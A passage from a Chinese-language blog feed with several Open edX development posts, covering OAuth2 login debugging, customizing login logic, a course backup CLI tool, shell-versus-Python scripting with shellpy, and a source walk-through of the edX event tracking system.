&lt;p&gt;从中我们找到了user_info对于的方法，它来自&lt;a href="https://github.com/edx/edx-oauth2-provider/blob/master/edx_oauth2_provider/views.py#L201"&gt;edx_oauth2_provider&lt;/a&gt;，不要问题为何知道。。&lt;/p&gt;
&lt;p&gt;如果你要手动处理oauth2，试试：&lt;a href="https://requests-oauthlib.readthedocs.org/en/latest/"&gt;requests-oauthlib&lt;/a&gt;，分步调试的话，可以看这个:&lt;a href="https://requests-oauthlib.readthedocs.org/en/latest/examples/google.html"&gt;examples/google&lt;/a&gt;，不过需要https&lt;/p&gt;
&lt;p&gt;更多的调试细节，比如各个参数的含义，那么你需要了解oauth2协议本身，那样可以从http层面调试，否则会很艰难，还是尽量使用oauth2 client吧&lt;/p&gt;
&lt;p&gt;如果你对过程参数感兴趣可以参考&lt;a href="http://wiki.connect.qq.com/%E4%BD%BF%E7%94%A8authorization_code%E8%8E%B7%E5%8F%96access_token"&gt;使用Authorization_Code获取Access_Token&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;对原理说的最清楚的为&lt;a href="https://developers.douban.com/wiki/?title=oauth2"&gt;使用 OAuth 2.0 访问豆瓣 API&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;当携带code请求access_token是，使用http --form提交，例子如：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http --form http://LMS/oauth2/access_token  client_id=key client_secret=secret code=xxx grant_type=authorization_code redirect_uri=http://domain_test
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;至于如何拿到code&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http --form http://LMS/oauth2/access_token  client_id=key client_secret=secret code=xxx grant_type=authorization_code redirect_uri=http://domain_test
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;```&lt;/p&gt;
&lt;p&gt;，然后你将得到access token，其中有id_token参数，这个参数是jwt加密后的,需要解密&lt;/p&gt;
&lt;h1&gt;更改login机制&lt;/h1&gt;
&lt;p&gt;我们可能处于各种原因需要修改login机制，诸如想同时支持email和username，诸如不想验证用户的有效性，诸如允许某些用户携带秘钥直接登录&lt;/p&gt;
&lt;p&gt;在此分享一下同时支持email和username的登录方式的思路。更改登录逻辑当然是核心&lt;/p&gt;
&lt;p&gt;登录逻辑在&lt;code&gt;common/djangoapps/student/views.py&lt;/code&gt;中的login_user函数，更改这部分倒是容易，麻烦反而在前端&lt;/p&gt;
&lt;p&gt;前端并不写在template里，而是写在&lt;code&gt;openedx/core/djangoapps/user_api/views.py&lt;/code&gt;中，找到&lt;code&gt;LoginSessionView&lt;/code&gt;更改即可&lt;/p&gt;
&lt;h1&gt;QQ/微信登录&lt;/h1&gt;
&lt;p&gt;关于QQ登录大体流程在OAuth2 client中已经说了，如果你在这部分困难重重，除了QQ本身的坑之外（对此我们无能为力），你最好确保自己熟悉OAuth2，这样方便&lt;code&gt;单步调试&lt;/code&gt;,只要你走通了一个OAuth2认证，其他的基本没有难度&lt;/p&gt;
&lt;p&gt;调试的细节建议参考&lt;a href="http://wiki.connect.qq.com/%E5%BC%80%E5%8F%91%E6%94%BB%E7%95%A5_client-side"&gt;开发攻略_Client-side&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;客户端注册：&lt;a href="http://connect.qq.com/"&gt;connect.qq.com&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;移动端跳转&lt;/h1&gt;
&lt;p&gt;如果你不采用彼岸准的oauth2的方式来认证用户，而是由于各种历史原因想走捷径（最好不要这么干！很脏乱，不好维护）。好吧你还是不听，那我建议你采用jwt的方式来携带用户信息，应为有加密，起码它至少是安全的&lt;/p&gt;
&lt;p&gt;关于jwt你可以参考我的这篇文章:&lt;a href="http://blog.just4fun.site/jwt-note.html"&gt;JWT学习笔记&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;总结&lt;/h1&gt;
&lt;p&gt;关于用户系统，我最喜欢的一种设计是，它应该是可插拔式的&lt;/p&gt;
&lt;h1&gt;工具&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://tool.chinaz.com/tools/urlencode.aspx"&gt;url转码&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 12 Apr 2016 00:00:00 +0000</pubDate><guid>tag:,2016-04-12:Open-edX-login-explore.html</guid><category>edx</category></item><item><title>Open edX课程备份工具</title><link>/backup-open-edx-course.html</link><description>&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;就教育而言，内容始终是个宝贵资源，随着平台课程增多，如何备份就是个摆上日程的问题了，当课程还少的时候，采用定人定期备份的方式也觉得尚可接受，可手动备份的缺陷太多&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;重复性的导入导出极其乏味，浪费时间&lt;/li&gt;
&lt;li&gt;导出课程名是随机字符，很闹归类&lt;/li&gt;
&lt;li&gt;人类不善于且厌恶重复性的工作，容易出错&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这类工作让代码来做再合适不过了，所以我写了个备份Open edx课程的工具，已经上传到github和pypi，直接安装就可使用&lt;/p&gt;
&lt;h1&gt;使用&lt;/h1&gt;
&lt;p&gt;当前版本只支持python2&lt;/p&gt;
&lt;p&gt;建议采用virtualenv来管理环境（virtualenv -p /usr/bin/python2 env）,使用centos的同学最好采用以上建议，其他操作系统的其他同学可以无视&lt;/p&gt;
&lt;p&gt;我们先来看下如何使用，十分简单，首先安装它：&lt;code&gt;pip install course_backup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;安装完成后，执行&lt;code&gt;course_backup --help&lt;/code&gt;会看到参数提示&lt;/p&gt;
&lt;p&gt;首先你需要登录studio，查看你的cookies中sessionid和csrftoken字段，然后填入配置文件，默认的配置文件为&lt;code&gt;~/.backup_course.ini&lt;/code&gt;,当然你也可以自己指定它&lt;/p&gt;
&lt;p&gt;我的配置文件为(cat ~/.backup_course.ini):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[main]&lt;/span&gt;
&lt;span class="na"&gt;studio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;http://192.168.0.100:18010&lt;/span&gt;
&lt;span class="na"&gt;sessionid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;2aerthgca4fyqt4hqza38jhmoue9te5v&lt;/span&gt;
&lt;span class="na"&gt;csrftoken&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;c4DiddgttfhhttjfKrCb47YQBeyS&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;填好配置文件后就可以启动备份任务啦&lt;/p&gt;
&lt;h3&gt;现在开始备份&lt;/h3&gt;
&lt;p&gt;course_backup --start &lt;/p&gt;
&lt;h3&gt;晚上两点开始备份&lt;/h3&gt;
&lt;p&gt;course_backup --start  --night&lt;/p&gt;
&lt;h3&gt;指定配置文件&lt;/h3&gt;
&lt;p&gt;course_backup --start --config_file ./my_config_file.ini&lt;/p&gt;
&lt;h3&gt;指定备份目录&lt;/h3&gt;
&lt;p&gt;course_backup --start --courses_data_path /tmp/data&lt;/p&gt;
&lt;h3&gt;滚动备份&lt;/h3&gt;
&lt;p&gt;course_backup --start --night --interval_days 7 --courses_data_path /tmp/data&lt;/p&gt;
&lt;p&gt;每七天备份一次，滚动周期为3周（超过3周的文件将自动删除）&lt;/p&gt;
&lt;h1&gt;Todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;滚动备份&lt;/li&gt;
&lt;li&gt;只备份差异版本&lt;/li&gt;
&lt;li&gt;定时任务（for humans）&lt;/li&gt;
&lt;li&gt;云端同步&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;反思&lt;/h1&gt;
&lt;p&gt;这个自己写的工具从使用来看倒是挺顺手的。不过设计的时候，有一点始终让我左右为难：是提供一体化的解决方案好，还是让工具只专注在一件事（诸如只下载课程），然后把它和其他linux工具组合起来使用&lt;/p&gt;
&lt;p&gt;《Unix编程艺术》里建议说&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;do one thing，and do well&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这也是Unix哲学提倡的。&lt;/p&gt;
&lt;p&gt;陷入到实际项目中，什么叫one thing呢？就很让人头疼，在这里我可能觉得backup courses整件事就是one thing，而其他人可能觉得download course是one thing，other thing可以通过组合其他工具，这样最终完成backup courses，诸如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;course_backup提供download course指令（粒度似乎很合适，利落）&lt;/li&gt;
&lt;li&gt;course_backup提供所有课程id&lt;/li&gt;
&lt;li&gt;通过course_backup首先获得所有id，然后通过bash写一个循环来download all courses&lt;/li&gt;
&lt;li&gt;使用cron来写定时任务&lt;/li&gt;
&lt;li&gt;使用bash来写滚动备份功能&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你真的这样做，你可能会发现，实际上我们只是把编程的任务从python移交到bash脚本里。&lt;/p&gt;
&lt;p&gt;在bash里写逻辑是我极不情愿做的一件事，相比于shell里那些好用的工具（vim/grep/find/sed...），bash的语法简直丑哭。所以就我而言我会选择尽可能用python把逻辑写到course_backup里，对外暴露出配置选项，那么我的one thing粒度可能大一些&lt;/p&gt;
&lt;p&gt;即便如此我对一些东西是不是应该包含在工具内还是犹豫不决，即便现在也是，诸如定时任务功能是应该用系统的cron来做还是采用python的定时任务模块来写到工具内部，写在外部的好处是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户可以自由写定时任务&lt;/li&gt;
&lt;li&gt;代码简介干净&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而混杂在工具里，就是这个工具不得不是一个常驻进程，同时为了追求灵活的配置参数，解析参数的代码也会很长，而这些本不是核心代码，不过是重造了一个丑陋的车轮&lt;/p&gt;
&lt;p&gt;可把定时功能混和在工具里，也有好处&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对用户而言，上手容易，不需要而外去学cron和linux脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然你可以说这是我对目标用户的定位不够清晰。这又是另一种&lt;code&gt;度&lt;/code&gt;的问题了。工程问题也许就许多这一类各种因素都需要权衡的问题&lt;/p&gt;
&lt;p&gt;关于one thing的粒度，我一直拿捏不好，不知道别人是不是也有这个疑惑。我的自我安慰是这是一件需要权衡的事，也许还包含武断/拖鞋的/拍脑袋的过程，也许我们会把它称为直觉，无论用哪个词，指的似乎都是非理性的判断过程&lt;/p&gt;
&lt;p&gt;这可能也是《Unix编程艺术》书名中艺术的所指吧&lt;/p&gt;
&lt;p&gt;我并不是说我不喜欢&lt;code&gt;do one thing，and do well&lt;/code&gt;这个建议，相反，它可能是我最喜欢的几个编程箴言之一，它优美而非线性，需要我们不断打磨练习和试错。在我读过的所有计算机的书里，《Unix编程艺术》和《代码大全》可能是我最喜欢的两本实践类指导书籍，我把他们看做best practice。&lt;/p&gt;
&lt;p&gt;付诸直觉的事，尤其是在各种特质中做折衷选择的事，决策者肯定都会有足够的理由为自己辩护，最后我们能说的可能只有&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Talk is cheap， show me your code&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;创建项目&lt;/h1&gt;
&lt;h3&gt;上传到pypi&lt;/h3&gt;
&lt;h1&gt;源码&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/wwj718/course_backup"&gt;course_backup&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 12 Apr 2016 00:00:00 +0000</pubDate><guid>tag:,2016-04-12:backup-open-edx-course.html</guid><category>edx</category></item><item><title>珍爱生命，慎用shell</title><link>/shell-and-shellpy.html</link><description>&lt;h1&gt;引子&lt;/h1&gt;
&lt;p&gt;使用linux有几个年头了，老实说，我不能想象没有shell的世界，那些精巧灵活的工具（管道/find/grep/sed/vim...）让琐事变得容易。同时我也害怕shell脚本满天飞的世界，还好大多时候我们在shell都是敲些短命令。就像害怕perl/php/javascript脚本满天飞的世界，尽管它们确实满天在飞了。。。。它们都有独到的设计，对特定问题的解决也出类拔萃，可是就语法本身而言读写起来真的不是很愉快的体验&lt;/p&gt;
&lt;h1&gt;bash的语法&lt;/h1&gt;
&lt;p&gt;相比于shell中各类工具的灵活的强大，bash语法的丑陋简直令人咋舌&lt;/p&gt;
&lt;p&gt;这是一种典型的&lt;code&gt;quick and dirty&lt;/code&gt;,各种临时方案风格的设计，一致性很糟糕&lt;/p&gt;
&lt;p&gt;如果仅是使用单行命令还好，一旦试图在bash中变大逻辑，写脚本，就很痛苦了，痛苦程度要比写perl好些&lt;/p&gt;
&lt;p&gt;带着这种既爱又恨的心情，每当看到有助于书写shell的工具，都会留意。分享一些还不错的&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/koalaman/shellcheck"&gt;shellcheck&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;a static analysis tool for shell scripts&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果你非要用bash编程，可以试试fish，对bash的许多恶心语法做了改进，换句话说，如果你是新手，且使用fish，你需要注意它的语法和bash有不少差异，这意味着你照着书本敲的指令很可能无法运行&lt;/p&gt;
&lt;h1&gt;python&lt;/h1&gt;
&lt;p&gt;已经越来越多的系统管理员，使用python来运维系统，尤其是ansible这样的神器发布之后&lt;/p&gt;
&lt;p&gt;对于日常的系统管理任务，python也基本都能胜任，尤其是需要写复杂逻辑的时候，bash的&lt;code&gt;&amp;amp;{}&amp;gt;.[[=]]&lt;/code&gt;会让你发疯的，快投入python怀抱吧&lt;/p&gt;
&lt;p&gt;我之前写的这篇文章把我日常与系统打交道用到的工具罗列了一下：&lt;a href="http://blog.just4fun.site/Python-for-system-administrators.html"&gt;Python与系统日常管理&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你喜欢shell，又为其语法所累，我也是这样，我现在的偏好是：以python的方式使用shell，也许你也可以试试&lt;/p&gt;
&lt;h1&gt;shellpy&lt;/h1&gt;
&lt;p&gt;这是我今天早上醒来逛github看到的一个东西&lt;/p&gt;
&lt;p&gt;日常而言，对于具体的任务，我们都习惯在shell里直接敲命令，好比&lt;code&gt;git add common&lt;/code&gt;/&lt;code&gt;ack class --python&lt;/code&gt;/&lt;code&gt;http GET www.google.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果这些命令都在python用subprocess写可能会比较费事，即便使用&lt;code&gt;sh&lt;/code&gt;这样的神器，写起来感觉还是需要看看文档，有没有一种能让我们在python更自然地书写bash的方式呢，这就是&lt;a href="https://github.com/lamerman/shellpy"&gt;shellpy&lt;/a&gt;项目的初衷，它实际上是包装了subprocess&lt;/p&gt;
&lt;p&gt;这样一来，我们能自然地使用bash中各类神器，同时使用python来控制逻辑&lt;/p&gt;
&lt;p&gt;整个世界一下变得干净而清爽&lt;/p&gt;
&lt;h3&gt;上手&lt;/h3&gt;
&lt;p&gt;上手很简单，看一下官方的示例就好了&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;import tempfile
import os.path
from shellpython.helpers import Dir

# We will make everything in temp directory. Dir helper allows you to change current directory
# withing &amp;#39;with&amp;#39; block
with Dir(tempfile.gettempdir()):
    if not os.path.exists(&amp;#39;shellpy&amp;#39;):
        # just executes shell command
        `git clone https://github.com/lamerman/shellpy.git

    # switch to newly created tempdirectory/shellpy
    with Dir(&amp;#39;shellpy&amp;#39;):
        # here we capture result of shell execution. log here is an instance of Result class
        log = `git log --pretty=oneline --grep=&amp;#39;Create&amp;#39;

        # shellpy allows you to iterate over lines in stdout with this syntactic sugar
        for line in log:
            if line.find(&amp;#39;README.md&amp;#39;):
                hashcode = log.stdout.split(&amp;#39; &amp;#39;)[0]
                print hashcode
                exit(0)

        print &amp;#39;The commit where the readme was created was not found&amp;#39;

exit(1)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;执行它：&lt;code&gt;shellpy example/git.spy&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果你熟悉ipython，你可能觉得这不就是把ipython的&lt;code&gt;!&lt;/code&gt;换成`么。哈哈，我也这样觉得，不过好处在于，这样我们脱离终端，可以在python脚本里写bash啦，而不只是在ipython里&lt;/p&gt;
&lt;h3&gt;import_from_python&lt;/h3&gt;
&lt;p&gt;我们也可以在pyhton代码中直接调用spy文件，参考：&lt;a href="https://github.com/lamerman/shellpy/blob/master/example/import_from_python/import.py"&gt;import_from_python&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;更多demo&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/lamerman/shellpy/tree/master/example"&gt;example&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;资源&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jlevy/the-art-of-command-line"&gt;the-art-of-command-line&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 10 Apr 2016 00:00:00 +0000</pubDate><guid>tag:,2016-04-10:shell-and-shellpy.html</guid><category>dev-tools</category></item><item><title>explore Open edX tracking system</title><link>/explore-Open-edX-tracking-system.html</link><description>&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;最近在折腾Open edX数据相关的东西，同时试着将open edx与机器学习结合&lt;/p&gt;
&lt;p&gt;如果你是EDM（educational data mining）的新玩家（我也是新手233）,对教育领域的数据感兴趣，推荐你这篇论文《教育数据挖掘研究进展综述》，了解一下这个领域的概况和进展&lt;/p&gt;
&lt;p&gt;官方的insights显得太重，我们打算享用这个免费午餐，但不定制它。对于个性化的数据分析，我们准备另起炉灶，完全独立于Open edX本身。架构上的设计主要为&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;采用edx的tracking system（这套机制的设计十分聪明），但产生独立的log，这样一来既不污染insights的数据源，分析时也避免从一大推的数据里去过滤数据 &lt;/li&gt;
&lt;li&gt;为了对接到edx本身，诸如需要获取课程和用户数据，采用我之前写的&lt;a href="https://github.com/wwj718/edx_siteapi"&gt;edx_siteapi&lt;/a&gt;与Open edX系统通信。&lt;/li&gt;
&lt;li&gt;将其作为一个独立的服务&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我用周末的两天，搭建了初始模型，从目前的进展看来，这条路似乎还算康庄大道&lt;/p&gt;
&lt;h1&gt;任务描述&lt;/h1&gt;
&lt;p&gt;架构中的第一条，产生了难题，我试着去hack tracking system的时候，发现它并不是个平坦的结构，hack起来十分痛苦，而我定制开源系统的原则之一是尽可能不侵入原代码。尽可能尊重原有架构，试着去理解它而不是急着改造它，后者的代价太沉重了，危机四伏&lt;/p&gt;
&lt;p&gt;所以眼前的第一个任务是理解tracking system的机制，并优雅地定制它&lt;/p&gt;
&lt;h1&gt;最初思路&lt;/h1&gt;
&lt;h3&gt;另起炉灶&lt;/h3&gt;
&lt;p&gt;写一个rest服务，在js中用ajax去发送事件(当然你也可以用edx采用的backbone)，对应的rest服务去写日志（采用django或是python原生的方式都行），这种方式简单粗暴。因为违背了我拓展开源系统的原则，所以直接pass了&lt;/p&gt;
&lt;h3&gt;拓展既有的tracking system&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://event-tracking.readthedocs.org/en/latest/user_guide/design.html#best-practices"&gt;best-practices&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;eventtracking&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;tracker&lt;/span&gt;
&lt;span class="n"&gt;tracker&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;emit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;some.event.name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;foo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bar&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="c1"&gt;#未注册的事件&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;问题是日志没有单独剥离出来，分析时，日志量巨大，需要筛选出来，所以这是我们主要需要解决的问题&lt;/p&gt;
&lt;p&gt;更好的范式为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;eventtracking&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;tracker&lt;/span&gt;
&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;tracker&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_tracker&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;event_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;tracker&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;emit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;event_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;event_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Open edX tracking system的设计&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/event-tracking/blob/master/doc/user_guide/design.rst"&gt;event-tracking/doc/user_guide/design.rst&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://event-tracking.readthedocs.org/en/latest/user_guide/design.html"&gt;Design doc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://openedx.atlassian.net/wiki/display/AN/Event+Design+and+Review+Process"&gt;Event Design and Review Process&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://openedx.atlassian.net/wiki/display/AN/Video+Bumper+Events"&gt;Video Bumper Events&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Other Tracking Systems（edx支持）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.datadoghq.com/"&gt;Data Dog&lt;/a&gt;: 一种系统监控工具，应用监控服务商（saas）&lt;ul&gt;
&lt;li&gt;airbnb在用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://segment.com/"&gt;Segment&lt;/a&gt;: 希望做出一款能与KISSmetrics或Google Analytics展开有力竞争的产品&lt;/li&gt;
&lt;li&gt;Google Analytics&lt;/li&gt;
&lt;li&gt;Deprecated APIs&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;出于国内网络的原因，我们可能需要考虑国内的Analytics服务，由于Analytics用种普遍需求，所以国内也容易找到同类产品：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://tongji.baidu.com/"&gt;tongji.baidu.com&lt;/a&gt; :百度&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ta.qq.com/"&gt;ta.qq.com&lt;/a&gt;:腾讯&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Open edX中的tracking log&lt;/h3&gt;
&lt;p&gt;Open edX中的tracking system产生的log与系统业务相关，数据特征皆为教育者所关心。并不是一种不是通用的数据（诸如nginx产生的日志就很通用，仅关心http请求本身），正是这种特质，使其适合作为EDM的数据源&lt;/p&gt;
&lt;h1&gt;源码分析&lt;/h1&gt;
&lt;p&gt;由于当前文档的匮乏，我们只好直接翻源码了，涉及的源码主要包括&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/event-tracking"&gt;event-tracking&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/common/djangoapps/track"&gt;track&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们从产生emit（从语义就可以知道这是提交日志事件的功能函数）开始追踪，目的是找到产生独立log的方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-&amp;gt;&lt;/code&gt; &lt;a href="https://github.com/edx/event-tracking/blob/master/eventtracking/tracker.py#L65"&gt;emit&lt;/a&gt;  有事件监听&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-&amp;gt;&lt;/code&gt; &lt;a href="https://github.com/edx/event-tracking/blob/master/eventtracking/tracker.py#L41"&gt;self.routing_backend = RoutingBackend(backends=backends, processors=processors)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从class的名字我们可以猜到这个类（&lt;a href="https://github.com/edx/event-tracking/blob/master/eventtracking/tracker.py#L35"&gt;Tracker&lt;/a&gt;）基本就是我们要找的东西啦&lt;/p&gt;
&lt;p&gt;接下来找侵入的地方：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-&amp;gt;&lt;/code&gt; &lt;a href="https://github.com/edx/event-tracking/blob/master/eventtracking/tracker.py#L133"&gt;tracker.get_tracker()&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;eventtracking&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;tracker&lt;/span&gt;  &lt;span class="c1"&gt;#实际上是eventtracking/tracker.py文件&lt;/span&gt;
&lt;span class="n"&gt;tracker&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tracker&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_tracker&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#得到TRACKERS[&amp;#39;default&amp;#39;] 在register_tracker赋值 ，产生疑惑：register_tracker何时被注册的&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-&amp;gt;&lt;/code&gt; &lt;code&gt;eventtracking/django/__init__.py&lt;/code&gt; 里override_default_tracker()注册tracker，而&lt;code&gt;eventtracking.django&lt;/code&gt;的&lt;a href="https://github.com/edx/event-tracking/blob/master/eventtracking/django/apps.py#L7"&gt;EventTrackingConfig&lt;/a&gt;是触发上边代码的地方，具体原理可见：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#cms/envs/common.py&lt;/span&gt;
    &lt;span class="c1"&gt;# Tracking&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;track&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;eventtracking.django.apps.EventTrackingConfig&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="c1"&gt;#这里最终触发注册&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;所以我们完全可以构造自己的tracker，因为TRACKERS是个dict，所以可以同时存在任意多的tracker，每个tracker可以有自己的backends，至此，探索完毕，问题解决&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;至于细节问题，构造tracker是主要的任务，直接用Tracker构造一个新的就好，核心参数是&lt;code&gt;backends, ThreadLocalContextLocator(), processors&lt;/code&gt;,其中backends是定制化的核心，之后加入到TRACKERS中，调用时，&lt;code&gt;from eventtracking import mytracker&lt;/code&gt;就好，其他和原生的tracker无异&lt;/p&gt;
&lt;h1&gt;backend and middleware&lt;/h1&gt;
&lt;p&gt;既然在读这块的源码，解决完任务，顺便做了更全面的探索（从框架层）&lt;/p&gt;
&lt;h3&gt;backend&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#lms/envs/aws.py&lt;/span&gt;
&lt;span class="c1"&gt;# Event tracking&lt;/span&gt;
